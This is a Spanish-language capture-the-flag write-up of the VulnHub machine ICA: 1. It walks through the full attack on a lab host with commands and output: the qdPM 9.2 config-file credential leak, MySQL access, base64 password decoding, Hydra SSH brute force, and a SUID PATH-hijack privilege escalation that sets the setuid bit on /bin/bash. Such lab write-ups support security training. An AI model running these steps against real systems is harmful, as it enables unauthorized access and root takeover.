---
layout: single
title: ICA 1 - VulnHub
excerpt: "La maquina ICA: 1 de la plataforma de VulnHub esta catalogada como facil vamos a estar abusando de una vulnerabilidad en el service qdPM que corre la maquina para obtener credenciales y conectarnos al servico Mysql y poder tener el nombre de todos los usuarios y contraseñas para conectarnos por ssh y ganar acceso para la escalada de privilegios tendremos que abusar de un binario que es SUID"
date: 2023-02-22
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-ica1/logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
tags:  
  - qdPM 9.2
  - MYSQL Service
  - Brute Force 
  - SUID - Path Hijacking
---
![](/assets/images/vh-writeup-ica1/logo.png)

```bash
❯ whichSystem.py 192.168.100.31

192.168.100.31 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80,3306,33060 192.168.100.31 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 15:44 CST
Nmap scan report for 192.168.100.31
Host is up (0.00037s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 0e77d9cbf80541b9e44571c101acda93 (RSA)
|   256 4051934bf83785fda5f4d727416ca0a5 (ECDSA)
|_  256 098560c535c14d837693fbc7f0cd7b8e (ED25519)
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: qdPM | Login
3306/tcp  open  mysql   MySQL 8.0.26
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-09-25T10:47:29
|_Not valid after:  2031-09-23T10:47:29
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 40
|   Capabilities flags: 65535
|   Some Capabilities: DontAllowDatabaseTableColumn, SupportsLoadDataLocal, Speaks41ProtocolNew, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, LongColumnFlag, IgnoreSigpipes, LongPassword, IgnoreSpaceBeforeParenthesis, SupportsTransactions, InteractiveClient, ConnectWithDatabase, FoundRows, ODBCClient, SupportsCompression, Support41Auth, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: g \x14m\x1F*gh\x05ioN\x0E\x17o_Il 6
|_  Auth Plugin Name: caching_sha2_password
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

```bash
❯ nmap --script=http-enum -p80 192.168.100.31 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 15:46 CST
Nmap scan report for 192.168.100.31
Host is up (0.00058s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /backups/: Backup folder w/ directory listing
|   /robots.txt: Robots file
|   /batch/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|   /core/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|   /install/: Potentially interesting folder
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|   /manual/: Potentially interesting folder
|   /template/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
MAC Address: 00:0C:29:0A:1A:6C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

## Enumeracion

```bash
❯ whatweb http://192.168.100.31
http://192.168.100.31 [200 OK] Apache[2.4.48], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[192.168.100.31], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]
```

Esta es la web

![](/assets/images/vh-writeup-ica1/Web1.png)

Y vemos que esta usando `qdPM 9.2` nos estan dando la version

Aqui nos explican en que consiste <https://qdpm.net/> es un herramienta para gestionar tus proyectos

Vamos a ver si la version `qdPM 9.2` tiene vulnerabilidades

```bash
❯ searchsploit qdPM 9.2
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                  | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                | php/webapps/50176.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vemos un `Password Exposure (Unauthenticated)` vamos a ver en que consiste

Si examinas el archivo nos esta dando esta informacion 

```bash
❯ searchsploit -x php/webapps/50176.txt

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.
```

Nos esta diciendo que que la contraseña para la base de datos esta en un archivo yml vamos a ver que pasa

Si pones la ruta te descarga un archivo `.yml`

![](/assets/images/vh-writeup-ica1/Web2.png)

```bash
core/config/databases.yml
```

Y tenemos credenciales

```bash
❯ ls
 databases.yml
❯ catnp databases.yml
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: databases.yml
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │   
   2   │ all:
   3   │   doctrine:
   4   │     class: sfDoctrineDatabase
   5   │     param:
   6   │       dsn: 'mysql:dbname=qdpm;host=localhost'
   7   │       profiler: false
   8   │       username: qdpmadmin
   9   │       password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
  10   │       attributes:
  11   │         quote_identifier: true  
  12   │   
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Como las credenciales son para una base de datos pues nos vamos a conectar a ella ya que el puerto esta abierto 

Y funcionan

`qdpmadmin:UcVQCMQk2STVeS6J`

```bash
❯ mysql -uqdpmadmin -h 192.168.100.31 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 93
Server version: 8.0.26 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

Vamos a ver las bases de datos

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| qdpm               |
| staff              |
| sys                |
+--------------------+
6 rows in set (0.037 sec)
MySQL [(none)]> 
```

Vamos a usar la base de datos `qdpm` y vamos a enumerar sus tablas

```bash
MySQL [(none)]> use qdpm;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [qdpm]> show tables;
+----------------------+
| Tables_in_qdpm       |
+----------------------+
| attachments          |
| configuration        |
| departments          |
| discussions          |
| discussions_comments |
| discussions_reports  |
| discussions_status   |
| events               |
| extra_fields         |
| extra_fields_list    |
| phases               |
| phases_status        |
| projects             |
| projects_comments    |
| projects_phases      |
| projects_reports     |
| projects_status      |
| projects_types       |
| tasks                |
| tasks_comments       |
| tasks_groups         |
| tasks_labels         |
| tasks_priority       |
| tasks_status         |
| tasks_types          |
| tickets              |
| tickets_comments     |
| tickets_reports      |
| tickets_status       |
| tickets_types        |
| user_reports         |
| users                |
| users_groups         |
| versions             |
| versions_status      |
+----------------------+
35 rows in set (0.003 sec)

MySQL [qdpm]> 

```

Y no hay nada 

```bash
MySQL [qdpm]> select * from users;
Empty set (0.002 sec)

MySQL [qdpm]> 
```

Vamos a listar bases de datos otra vez y vemos `staff`

```bash
MySQL [qdpm]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| qdpm               |
| staff              |
| sys                |
+--------------------+
6 rows in set (0.003 sec)

MySQL [qdpm]> 

```

Vemos la tabla `user` vamos a ver que hay dentro

```bash
MySQL [qdpm]> use staff;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [staff]> show tables;
+-----------------+
| Tables_in_staff |
+-----------------+
| department      |
| login           |
| user            |
+-----------------+
3 rows in set (0.002 sec)

MySQL [staff]> 
```

Y tenemos usuarios

```bash
MySQL [staff]> select * from user;
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
+------+---------------+--------+---------------------------+
5 rows in set (0.025 sec)

MySQL [staff]> 
```

Ahora vamos a ver la tabla `login` y vemos contraseñas en `base64` lo cual no es nada seguro almacenar contraseñas en `base64`

```bash
MySQL [staff]> select * from login;
+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
5 rows in set (0.005 sec)

MySQL [staff]> 
```

Vamos a poner los usuarios en un archivo

```bash
❯ /bin/cat users
smith
lucas
travis
dexter
meyer
```

Ahora vamos a `decodear` las cadenas para ver las contraseñas y metarlas a un archivo

```bash
❯ for password in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $password | base64 -d; echo; done | tee passwords
suRJAdGwLp8dy3rF
7ZwV4qtg42cmUXGX
X7MQkP3W29fewHdC
DJceVy98W28Y7wLg
cqNnBWCByS2DuJSy
❯ ls
 databases.yml   passwords   users
```

```bash
❯ /bin/cat passwords
suRJAdGwLp8dy3rF
7ZwV4qtg42cmUXGX
X7MQkP3W29fewHdC
DJceVy98W28Y7wLg
cqNnBWCByS2DuJSy
```

Bueno tenemos usuarios y contraseñas podemos usar la herramienta `hydra` y vemos que hay 2 usuarios con que pueden conectarse por `ssh`

```bash
❯ hydra -L users -P passwords 192.168.100.31 ssh -t 4
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-22 16:21:54
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking ssh://192.168.100.31:22/
[22][ssh] host: 192.168.100.31   login: travis   password: DJceVy98W28Y7wLg
[22][ssh] host: 192.168.100.31   login: dexter   password: 7ZwV4qtg42cmUXGX
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-22 16:22:09
```

Vamos a conectarnos como `travis:DJceVy98W28Y7wLg` 

```bash
❯ ssh travis@192.168.100.31
The authenticity of host '192.168.100.31 (192.168.100.31)' can't be established.
ECDSA key fingerprint is SHA256:id07REjHpxUg3LJ79297o4+hNX8MGbZneoBJ/AUvWWc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.31' (ECDSA) to the list of known hosts.
travis@192.168.100.31's password: 
Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep 25 14:55:01 2021 from 192.168.1.7
travis@debian:~$ 
```

## User.txt

```bash
travis@debian:~$ export TERM=xterm
travis@debian:~$ ls
user.txt
travis@debian:~$ cat user.txt 
ICA{Secret_Project}
travis@debian:~$ 
```

Bueno tenemos la contraseña de `dexter:7ZwV4qtg42cmUXGX` podemos convertirnos en el

```bash
travis@debian:~$ su dexter
Password: 
dexter@debian:/home/travis$ whoami
dexter
dexter@debian:/home/travis$ id
uid=1001(dexter) gid=1001(dexter) groups=1001(dexter)
dexter@debian:/home/travis$ hostname -I
192.168.100.31 
dexter@debian:/home/travis$ 
```

## Escalada de privilegios

Vemos una nota

```bash
dexter@debian:/home$ cd dexter/
dexter@debian:/home/dexter$ ls
note.txt
dexter@debian:/home/dexter$ cat note.txt 
It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not.
dexter@debian:/home/dexter$ 
```

Basicamente le esta diciendo que los archivos `ejecutables` son parcialmente visibles y que necesita averiguar si hay alguna vulnerabilidad o no 

Vamos a buscar por archivos `SUID`

```bash
dexter@debian:/home/dexter$ find / -perm -4000 -user root 2>/dev/null 
/opt/get_access
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
dexter@debian:/home/dexter$ 
```

El primero de todos es interesante `/opt/get_access`

```bash
dexter@debian:/home/dexter$ ls -l /opt/get_access
-rwsr-xr-x 1 root root 16816 Sep 25  2021 /opt/get_access
dexter@debian:/home/dexter$ 
```

Es un binario

```bash
dexter@debian:/home/dexter$ file /opt/get_access 
/opt/get_access: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=74c7b8e5b3380d2b5f65d753cc2586736299f21a, for GNU/Linux 3.2.0, not stripped
dexter@debian:/home/dexter$ 
```

Vamos a ejecutarlo a ver que hace

```bash
dexter@debian:/home/dexter$ /opt/get_access 

  ############################
  ########     ICA     #######
  ### ACCESS TO THE SYSTEM ###
  ############################

  Server Information:
   - Firewall:	AIwall v9.5.2
   - OS:	Debian 11 "bullseye"
   - Network:	Local Secure Network 2 (LSN2) v 2.4.1

All services are disabled. Accessing to the system is allowed only within working hours.

dexter@debian:/home/dexter$ 
```

Listando las cadenas de caracteres imprimibles `strings` el script hace esto por detras 

```bash
dexter@debian:/home/travis$ strings /opt/get_access | grep cat
cat /root/system.info
```

Obviamente no tenemos acceso

```bash
dexter@debian:/home/dexter$ ls -l /root/system.info
ls: cannot access '/root/system.info': Permission denied
dexter@debian:/home/dexter$ 
```

En el script no esta empleando la ruta absoluta  `/usr/bin/cat` si que lo esta haciendo de forma relativa  `cat` podemos aprovecharnos de eso

Vamos a indicarle que el `PATH` comienze en `/tmp` 

```bash
dexter@debian:/home/dexter$ cd /tmp
dexter@debian:/tmp$ touch cat
dexter@debian:/tmp$ chmod +x cat 
dexter@debian:/tmp$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
dexter@debian:/tmp$ export PATH=/tmp:$PATH
dexter@debian:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
dexter@debian:/tmp$ 
```

Vamos a desirle que nos le asigne el privilegio `SUID` ala `bash`

```bash
dexter@debian:/tmp$ nano cat
dexter@debian:/tmp$ /bin/cat cat 
chmod u+s /bin/bash
dexter@debian:/tmp$ 
```

Podemos convertirnos en `root`

```bash
dexter@debian:/tmp$ /opt/get_access 
All services are disabled. Accessing to the system is allowed only within working hours.

dexter@debian:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
dexter@debian:/tmp$ 
```

## Root flag

Vamos a reparar el `PATH` para poder ver la `flag`

```
bash-5.1# export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
bash-5.1# cd /root
bash-5.1# whoami
root
bash-5.1# ls
root.txt  system.info
bash-5.1# cat root.txt 
ICA{Next_Generation_Self_Renewable_Genetics}
bash-5.1# 
```














































































































